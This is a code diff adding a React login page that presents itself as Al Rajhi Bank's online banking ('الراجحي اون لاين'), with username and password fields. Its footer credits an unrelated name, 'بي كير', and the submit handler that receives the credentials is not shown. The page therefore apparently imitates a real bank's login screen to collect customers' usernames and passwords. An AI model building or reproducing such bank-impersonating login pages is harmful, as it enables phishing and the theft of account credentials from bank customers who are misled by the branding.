+          <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg,#2b86c0,#156394,#0c4269)" }} />
+
+          <div className="p-6 sm:p-9 flex flex-col items-center">
+            {/* Logo lockup */}
+            <div className="relative mb-5">
+              <div className="absolute inset-0 rounded-3xl blur-2xl bg-[#156394]/25" aria-hidden />
+              <div className="relative w-24 h-24 rounded-3xl bg-gradient-to-br from-white to-[#EAF3FA] border border-[#156394]/15 shadow-[inset_0_1px_0_rgba(255,255,255,0.9)] flex items-center justify-center">
+                <img src={brandLogo} alt="الشعار" className="w-16 h-auto" />
+
+              </div>
+            </div>
+
+            <h1 className="text-[22px] sm:text-2xl font-extrabold text-[#10243a] tracking-tight">
+              مرحباً بك في الراجحي
+            </h1>
+            <p className="mt-2 text-[13.5px] text-[#64748b] text-center leading-relaxed max-w-[320px]">
+              مرحبا بك في الراجحي اون لاين
+            </p>
+
+            {/* Single tab — login only */}
+            <div className="mt-6 w-full rounded-2xl border border-[#156394]/15 bg-[#EAF3FA] p-1.5">
+              <button
+                type="button"
+                className="w-full rounded-xl bg-white py-3 text-sm font-extrabold text-[#156394] shadow-sm border border-[#156394]/10"
+              >
+                تسجيل الدخول
+              </button>
+            </div>
+
+
+            <form onSubmit={onSubmit} className="w-full space-y-4">
+              <Field label="اسم المستخدم" active={focus === "u"}>
+                <input
+                  name="username"
+                  required
+                  autoComplete="username"
+                  placeholder="أدخل اسم المستخدم"
+                  dir="ltr"
+                  value={username}
+                  onChange={(e) => setUsername(e.target.value)}
+                  onFocus={() => setFocus("u")}
+                  onBlur={() => setFocus(null)}
+                  className="w-full bg-transparent outline-none text-[15px] tracking-wider text-[#10243a] placeholder:text-[#94a3b8] text-left"
+                  style={{ fontFamily: "'Outfit', 'Tajawal', sans-serif" }}
+                />
+
+              </Field>
+
+              <Field label="كلمة السر" active={focus === "p"}>
+                <input
+                  name="password"
+                  type={showPass ? "text" : "password"}
+                  required
+                  autoComplete="current-password"
+                  placeholder="••••••••"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  onFocus={() => setFocus("p")}
+                  onBlur={() => setFocus(null)}
+                  className="w-full bg-transparent outline-none text-[15px] text-[#10243a] placeholder:text-[#94a3b8] pl-14"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowPass((v) => !v)}
+                  className="absolute inset-y-0 left-3 my-auto h-8 rounded-lg px-2.5 text-[11px] font-bold text-[#156394] hover:bg-[#156394]/10 transition-colors"
+                >
+                  {showPass ? "إخفاء" : "إظهار"}
+                </button>
+              </Field>
+
+              {/* Remember me only */}
+              <div className="flex items-center justify-between px-1">
+                <label className="flex items-center gap-2 cursor-pointer">
+                  <input
+                    type="checkbox"
+                    name="remember"
+                    checked={remember}
+                    onChange={(e) => setRemember(e.target.checked)}
+                    className="h-4 w-4 rounded border-[#cbd5e1] text-[#156394] focus:ring-[#156394]/20"
+                  />
+                  <span className="text-[13px] font-medium text-[#64748b]">تذكرني</span>
+                </label>
+              </div>
+
+              <button
+                type="submit"
+                disabled={loading}
+                className="group relative w-full overflow-hidden rounded-2xl py-4 font-extrabold text-white text-[15px] shadow-[0_12px_30px_-8px_rgba(21,99,148,0.55)] active:scale-[0.985] transition-all disabled:opacity-70 disabled:cursor-not-allowed"
+                style={{ background: "linear-gradient(135deg,#2b86c0 0%,#156394 55%,#0c4269 100%)" }}
+              >
+                <span className="relative z-10 flex items-center justify-center gap-2">
+                  {loading ? (
+                    <>
+                      <span className="h-4 w-4 rounded-full border-2 border-white/40 border-t-white animate-spin" />
+                      جارٍ التحقق…
+                    </>
+                  ) : (
+                    <>
+                      تسجيل الدخول
+                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                        <path d="M19 12H5" />
+                        <path d="m12 19-7-7 7-7" />
+                      </svg>
+                    </>
+                  )}
+                </span>
+                <span className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/25 to-white/0 translate-x-[-120%] group-hover:translate-x-[120%] transition-transform duration-700" />
+              </button>
+            </form>
+
+          </div>
+        </div>
+
+        <p className="mt-5 text-center text-[11px] text-[#94a3b8]">
+          © بي كير — جميع الحقوق محفوظة
+        </p>
+      </div>
+    </div>
+  );
+}
+
+function Field({
+  label,
+  active,
+  children,
+}: {
+  label: string;
+  active: boolean;
+  children: React.ReactNode;
+}) {
+  return (
+    <div>
+      <label className="block text-[12.5px] font-bold text-[#334155] mr-1 mb-1.5">{label}</label>
+      <div
+        className={`relative flex items-center rounded-2xl border bg-[#F5F8FB] px-4 py-3.5 transition-all ${
+          active
+            ? "border-[#156394] bg-white ring-4 ring-[#156394]/10 shadow-sm"
+            : "border-[#e2e8f0] hover:border-[#cbd5e1]"
+        }`}
+      >
+        {children}
+      </div>
+    </div>
+  );
+}
+
